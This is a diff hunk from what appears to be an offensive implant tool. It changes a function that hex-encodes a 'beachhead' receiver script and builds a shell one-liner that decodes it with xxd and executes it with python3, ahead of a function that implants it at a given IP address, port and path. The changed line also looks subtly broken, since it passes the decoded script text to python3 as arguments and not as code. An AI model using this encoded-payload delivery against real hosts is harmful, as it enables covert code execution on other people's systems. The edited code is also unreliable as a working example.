@@ -13,7 +13,7 @@ def package_beachhead():
     with open(BEACHHEAD_LOCATION, 'r') as f:
         receiver = f.read()
     hex_beachhead = binascii.hexlify(receiver.encode('utf-8')).decode('utf-8')
-    return "xxd -r -p <<< " + hex_beachhead + " | python3"
+    return "CMD=`xxd -r -p <<< " + hex_beachhead + "`;python3 $CMD"
 
 def implant_beachhead(ip_addr, port, path):
     beachhead = package_beachhead()
